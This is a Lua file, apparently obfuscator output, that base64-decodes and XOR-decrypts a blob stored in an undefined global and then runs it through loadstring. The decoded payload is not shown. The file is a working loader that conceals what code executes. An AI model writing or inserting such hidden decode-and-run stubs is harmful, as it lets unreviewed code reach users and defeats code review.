local bit32 = bit32 or bit or {}
if not bit32.bxor then
	function bit32.bxor(a, b)
		local r, p = 0, 1
		for _ = 1, 32 do
			local ab, bb = a % 2, b % 2
			if ab ~= bb then r = r + p end
			a = (a - ab) / 2
			b = (b - bb) / 2
			p = p * 2
			if a == 0 and b == 0 then break end
		end
		return r
	end
end

local function YfWzrGBnRe(t)
	return table.concat(t)
end
local function btBknoooMvq(data)
	local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	data=string.gsub(data,'[^'..b..'=]','')
	return (data:gsub('.',function(x)
		if x=='=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
		if #x~=8 then return '' end
		local c=0
		for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
		return string.char(c)
	end))
end
local function kljBlexyR(s,k)
	local n=#s
	local o={}
	local kl=#k
	for i=1,n do
		o[i]=string.char(bit32.bxor(string.byte(s,i),k[((i-1)%kl)+1]))
	end
	return table.concat(o)
end
local SlHjuNHiZs=kljBlexyR(btBknoooMvq(YfWzrGBnRe(boHjXJLqJetK)),YiPWvNb)
local ntPlEfBYe=loadstring or load
assert(ntPlEfBYe,'loadstring missing')
local UIvDhIhB=assert(ntPlEfBYe(SlHjuNHiZs,'@hema'))
return UIvDhIhB()
